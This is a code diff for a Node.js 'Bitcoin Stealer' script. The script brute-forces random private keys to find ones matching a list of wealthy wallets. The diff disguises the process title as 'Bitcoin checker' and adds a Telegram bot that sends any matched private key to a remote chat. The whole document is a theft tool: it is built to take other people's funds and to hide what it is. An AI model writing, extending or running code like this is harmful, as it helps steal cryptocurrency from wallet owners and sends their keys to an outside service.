@@ -1,9 +1,15 @@
 "use strict";
 
-process.title = "Bitcoin Stealer by Michal2SAB";
+process.title = "Bitcoin checker";
 
 const CoinKey = require('coinkey');
 const fs = require('fs');
+const TelegramBot = require('node-telegram-bot-api');
+
+// Telegram bot configuration
+const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
+const bot = new TelegramBot(telegramToken);
 
 let privateKeyHex, ck, addresses;
 addresses = new Map();
@@ -19,8 +25,6 @@ function generate() {
     let ck = new CoinKey(Buffer.from(privateKeyHex, 'hex'));
     
     ck.compressed = false;
-    //console.log(ck.publicAddress)
-    // Remove "//" in line above if you wanna see the logs, but remember it's gonna slow down the process a lot
     
     // if generated wallet matches any from the riches.txt file, tell us we won!
     if(addresses.has(ck.publicAddress)){
@@ -32,11 +36,15 @@ function generate() {
         // save the wallet and its private key (seed) to a Success.txt file in the same folder 
         fs.writeFileSync('./Success.txt', successString, (err) => {
             if (err) throw err; 
-        })
+        });
+
+        // send a message to the Telegram bot
+        bot.sendMessage(telegramChatId, successString);
             
         // close program after success
         process.exit();
     }
+    
     // destroy the objects
     ck = null;
     privateKeyHex = null;
@@ -53,11 +61,11 @@ function r(l) {
 }
 
 console.log("\x1b[32m%s\x1b[0m", ">> Program Started and is working silently (edit code if you want logs)"); // don't trip, it's working
+
 // run forever
 while(true){
     generate();
     if (process.memoryUsage().heapUsed / 1000000 > 500) {
         global.gc();
     }
-    //console.log("Heap used : ", process.memoryUsage().heapUsed / 1000000);
 }
